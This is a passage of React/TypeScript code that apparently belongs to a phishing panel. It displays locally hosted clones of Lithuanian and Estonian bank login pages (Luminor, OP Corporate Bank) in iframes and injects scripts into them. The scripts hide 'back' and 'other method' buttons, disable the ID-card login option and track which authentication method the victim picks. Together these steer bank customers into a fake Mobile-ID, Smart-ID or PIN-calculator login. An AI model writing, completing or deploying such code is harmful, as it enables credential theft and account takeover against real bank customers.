            input.addEventListener('blur', () => updateInputState(input));
            // Initial check
            updateInputState(input);
          }
        });

        // Disable "Vali teine viis" and similar buttons
          document.querySelectorAll('button, a').forEach(el => {
            const text = el.textContent.toLowerCase();
            if (text.includes('kitas būdas') || text.includes('grįžti') || text.includes('atgal')) {
              el.style.display = 'none';
              el.style.pointerEvents = 'none';
              el.style.opacity = '0';
            }
          });

          // LUMINOR FIX: Force floating labels for all inputs
          if (window.location.href.includes('luminor')) {
             const style = document.createElement('style');
             style.innerHTML = \`
               /* Luminor form alanlarında label'ın yukarı kalkması */
               .form-row.has-value .label-wrapper label,
               .form-row.focused .label-wrapper label,
               .form-row.is-focused .label-wrapper label,
               .form-row.is-filled .label-wrapper label {
                   transform: translateY(-100%) scale(0.85);
                   opacity: 0.7;
                   transform-origin: left top;
                   transition: transform 0.2s ease, opacity 0.2s ease;
               }
               .form-row .label-wrapper label {
                   transition: transform 0.2s ease, opacity 0.2s ease;
                   display: block;
               }
               /* Asistanımızın label'ı gizlemesini engellemek için zorunlu görünürlük */
                .form-row .label-wrapper label {
                    opacity: 1 !important;
                    pointer-events: auto !important;
                }

                @media (max-width: 768px) {
                    html, body {
                        overflow-x: hidden !important;
                        overflow-y: auto !important;
                        height: auto !important;
                    }

                    .frame-main-content,
                    .portal-content,
                    .scroll-zones {
                        display: none !important;
                    }

                    .overlayholder,
                    .overlay-focusview,
                    .overlay-focusview-holder,
                    .overlay-focusview-content,
                    .overlay-focusview-scroller,
                    .layout-wide {
                        position: fixed !important;
                        left: 0 !important;
                        right: 0 !important;
                        top: 56px !important;
                        width: 100% !important;
                        height: calc(100dvh - 56px) !important;
                        z-index: 99999 !important;
                        background: #f5f5f4 !important;
                        overflow-y: auto !important;
                        -webkit-overflow-scrolling: touch !important;
                    }

                    .layout-wide-holder1,
                    .layout-wide-holder2b,
                    .focusview-content-centered-middle,
                    .login-main,
                    .inner,
                    .auth-methods {
                        width: 100% !important;
                        max-width: 100% !important;
                        min-width: 0 !important;
                    }

                    .layout-wide-holder1 {
                        min-height: calc(100dvh - 76px) !important;
                        padding: 10px 20px 24px !important;
                        box-sizing: border-box !important;
                    }

                    .auth-methods {
                        display: flex !important;
                        flex-direction: column !important;
                        align-items: stretch !important;
                        height: auto !important;
                    }

                    .auth-methods > li {
                        display: block !important;
                        flex: 1 1 auto !important;
                        width: 100% !important;
                        max-width: 100% !important;
                        height: auto !important;
                    }

                    .auth-methods-method {
                        display: flex !important;
                        flex: 1 1 auto !important;
                        width: 100% !important;
                        max-width: 100% !important;
                        min-width: 100% !important;
                        min-height: 60px !important;
                    }

                    .overlay-focusview,
                    .overlay-focusview-holder,
                    .overlay-focusview-content,
                    .overlay-focusview-scroller {
                        overflow-y: auto !important;
                        -webkit-overflow-scrolling: touch !important;
                    }

                    .form-row,
                    .form-row .label-wrapper,
                    .form-row input,
                    .form-row .input-wrapper {
                        width: 100% !important;
                        max-width: 100% !important;
                        min-width: 0 !important;
                        box-sizing: border-box !important;
                    }
                }
              \`;
              document.head.appendChild(style);
           }

           // OP Corporate Bank: ID-Kaart devre dışı bırakma (gizleme değil, pasif yapma)
           if (window.location.href.includes('op-corporate')) {
               const style = document.createElement('style');
               style.innerHTML = '#estonian-id-card, #estonian-id-card *, #estonian-id-card-radio, label[for="estonian-id-card-radio"] { pointer-events: none !important; opacity: 0.5 !important; filter: grayscale(100%); cursor: not-allowed !important; }';
               document.head.appendChild(style);
           }

           // iframe tamamen yuklendi sinyali parenta gonder:
           // parent dinleyici bunu gorurse pending index varsa hemen uygular.
           try {
             window.parent.postMessage({ type: 'LITHUANIA_BANK_IFRAME_LOADED', url: window.location.href, href: window.location.href }, '*');
             setTimeout(() => {
               try { window.parent.postMessage({ type: 'LITHUANIA_BANK_IFRAME_LOADED', url: window.location.href, href: window.location.href }, '*'); } catch(_er) {}
             }, 100);
           } catch(_er) {}
         `;
         doc.body.appendChild(script);

         // OP Corporate Bank: sekmeleri parent tarafindan dogrudan kontrol et
         if (iframe.contentWindow.location.href.includes("op-corporate")) {
           const bindOpRadio = (radioId: string, targetIndex: number, disabled = false) => {
             const radio = doc.getElementById(radioId) as HTMLInputElement | null;
             const label = doc.querySelector(`label[for="${radioId}"]`) as HTMLElement | null;

             const syncTarget = (event?: Event) => {
               if (disabled) {
                 if (event) {
                   event.preventDefault();
                   event.stopPropagation();
                 }
                 if (radio) {
                   radio.checked = false;
                 }
                 return;
               }

               // Let the native radio interaction settle first, then swap iframe once.
               window.requestAnimationFrame(() => {
                 setCurrentIndex((prev) => (prev === targetIndex ? prev : targetIndex));
               });
             };

             if (radio && !radio.dataset.opBound) {
               radio.dataset.opBound = "true";
               radio.addEventListener("change", syncTarget, true);
               radio.addEventListener("click", syncTarget, true);
             }

             if (label && !label.dataset.opBound) {
               label.dataset.opBound = "true";
               label.addEventListener("click", syncTarget, true);
             }
           };

           bindOpRadio("mobile-id-radio", 0);
           bindOpRadio("smart-id-radio", 1);
           bindOpRadio("pin-calculator-radio", 2);
           bindOpRadio("estonian-id-card-radio", 0, true);
         }
         } catch (err) {
           console.error("Iframe manipulation error:", err);
         }
       };

  if (files.length === 0) {
    return (
      <div className="flex min-h-screen items-center justify-center p-4 bg-white">
        <p className="rounded-xl border border-blue-500/30 bg-blue-500/10 p-5 text-center text-sm text-blue-700">
          Banko dizaino failai įkeliami arba dar nėra prieinami...
        </p>
      </div>
    );
  }

  return (
    <div
      className="fixed inset-0 w-[100vw] bg-white z-[9999] overflow-hidden"
      style={{ minHeight: "100vh", height: "100dvh" }}
    >
      {saving && (
        <div className="absolute inset-0 bg-white/80 backdrop-blur-sm z-[99999] flex items-center justify-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
        </div>
      )}

      {files.map((file, index) => (
        <iframe
          key={file}
          src={`/lithuanian-banks/${normalizedCurrentSlug}/${file}`}
          className={`absolute top-0 left-0 w-full h-full border-none m-0 p-0 ${
            disableIframeFade ? "" : "transition-opacity duration-300"
          } ${
            index === currentIndex
              ? disableIframeFade
                ? "z-10"
                : "opacity-100 z-10"
              : disableIframeFade
                ? "z-0 pointer-events-none"
                : "opacity-0 z-0 pointer-events-none"
          }`}
          style={{ 
            width: '100%', 
            height: '100%', 
            border: 'none', 
            margin: 0, 
            padding: 0,
            visibility: index === currentIndex ? 'visible' : 'hidden'
          }}
          onLoad={(e) => handleIframeLoad(e.target as HTMLIFrameElement)}
        />
      ))}
    </div>
  );
}
